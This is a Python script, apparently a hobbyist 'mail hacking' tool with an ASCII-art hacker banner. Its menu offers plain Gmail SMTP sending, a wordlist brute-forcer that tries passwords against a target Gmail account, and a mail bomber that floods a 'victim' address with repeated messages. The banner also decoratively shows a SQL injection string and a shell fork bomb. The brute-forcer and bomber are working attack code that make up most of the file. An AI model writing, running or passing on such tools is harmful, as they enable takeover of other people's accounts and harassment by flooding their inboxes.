import smtplib
import subprocess
import time
import colorama

subprocess.call("clear -x", shell=True)
colour = colorama
print(colour.Fore.GREEN + """
                                              `:oDFo:`         ---->DEVELOPED BY JF as AJ                   
                                           ./ymM0dayMmy/.                          
                                        -+dHJ5aGFyZGVyIQ==+-                    
                                    `:sm⏣~~Destroy.No.Data~~s:`                
                                 -+h2~~Maintain.No.Persistence~~h+-              
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
                      :we're.all.alike'`                     The.PFYroy.No.D7:  
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
                      :<script>.Ac816/                        sENbove3101.404:    
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
                      :#OUTHOUSE-  -s:                       /corykennedyData:    
                      :$nmap -oS                              SSo.6178306Ence:    
                      :Awsm.da:                            /shMTl#beats3o.No.:    
                      :Ring0:                             `dDestRoyREXKC3ta/M:    
                      :23d:                               sSETEC.ASTRONOMYist:    
                       /-                        /yo-    .ence.N:(){ :|: & };:    
                                                 `:Shall.We.Play.A.Game?tron/    
                                                 ```-ooy.if1ghtf0r+ehUser5`    
                                               ..th3.H1V3.U2VjRFNN.jMh+.`          
                                              `MjM~~WE.ARE.se~~MMjMs              
                                               +~KANSAS.CITY's~-`                  
                                                J~HAKCERS~./.`                    
                                                .esc:wq!:`                        
                                                 +++ATH` ------->EBAB FOR MAIL HACKING """"\n")

msg2 = colour.Fore.MAGENTA + """
           1.Normal sending mail
           2.Mail Brute_Forcer
           3.Mail_Bombing
           4.99 For Exit
       """


def S_mail():
    try:
        email = input(colour.Fore.YELLOW + "Enter sender email: ""\n")

        passwd = input(colour.Fore.YELLOW + "Enter sender passwd: ""\n")

        recvmail = input(colour.Fore.YELLOW + "Enter reciever email: ""\n")

        msg = input(colour.Fore.YELLOW + "type msg: ""\n")

        a = smtplib.SMTP("smtp.gmail.com", 587)
        a.ehlo()
        a.starttls()
        a.login(email, passwd)
        a.sendmail(email, recvmail, msg)

        print(colour.Fore.GREEN + "  [+]Mail was sent""\n")

        reuses = input(colour.Fore.YELLOW + "Enter y for resend bomb: ""\n")
        if reuses.capitalize() == "Y":
            S_mail()
        else:
            quit()
    except Exception as e:
        print(e)

    finally:
        print(colour.Fore.CYAN + "Thank you :}""\n")


def mali_Brute():
    print(colour.Fore.RED + " [+] Warning tool and password file must contain in same folder""\n")

    print(colour.Fore.RED + " [+] Attacker must connect with internet""\n")

    File = input(colour.Fore.YELLOW + "Enter a file name :""\n")

    bMail = input(colour.Fore.YELLOW + "Enter Target mail address :""\n")

    b = smtplib.SMTP("smtp.gmail.com", 587)
    b.starttls()
    b.ehlo()
    if File:
        try:
            a = open(File, "r")
            for word in a:
                try:
                    b.login(bMail, word)

                    print(colour.Fore.GREEN + " [$]password found: " + word + "\n")

                except Exception:
                    print(colour.Fore.RED + " [$]password not found""\n")
        except FileNotFoundError:
            print(colour.Fore.RED + "Sorry, No such file or directory ""\n")

    else:
        print(colour.Fore.Red + "You must give passwd file ""\n")

    reusebf = input(colour.Fore.YELLOW + "Enter y for resend bomb:""\n")
    if reusebf.capitalize() == "Y":
        mali_Brute()
    else:
        quit()


def mail_Bombing():
    try:
        print(
            colour.Fore.RED + "[+]It your risk you can create new email or you can use your oen email for bombing[+]""\n")

        Enter_mail = input(colour.Fore.YELLOW + "Enter Victim Mail: ""\n")

        Enter_frequency = int(input(colour.Fore.YELLOW + "Enter Frequency: ""\n"))

        Enter_time = int(input(colour.Fore.YELLOW + "Enter interval: ""\n"))

        bomb_mail = input(colour.Fore.YELLOW + "Enter sender mail: ""\n")

        mail_passwd = input(colour.Fore.YELLOW + "Enter sender passwd: ""\n")

        msg5 = input(colour.Fore.YELLOW + "Enter msg: ""\n")

        boo = smtplib.SMTP("smtp.gmail.com", 587)
        boo.starttls()
        boo.login(bomb_mail, mail_passwd)
        boo.ehlo()

        for i in range(Enter_frequency):
            boo.sendmail(bomb_mail, Enter_mail, msg5)
            time.sleep(Enter_time)
            print(str(i) + colour.Fore.GREEN + " [#]Sending mail""\n")

        print(colour.Fore.GREEN + " [@]Bomb Successfull""\n")

        reuseb = input(colour.Fore.YELLOW + "Enter y for resend bomb: ""\n")
        if reuseb.capitalize() == "Y":
            mail_Bombing()
        else:
            quit()
    except Exception as od:
        print(od)


print(msg2)
try:

    want = int(input(colour.Fore.YELLOW + "Enter option that shown in option: ""\n"))
    while True:
        if want == 1:
            S_mail()
            break
        elif want == 2:
            mali_Brute()
        elif want == 3:
            mail_Bombing()
        else:
            break
except Exception as ex:
    print(ex)
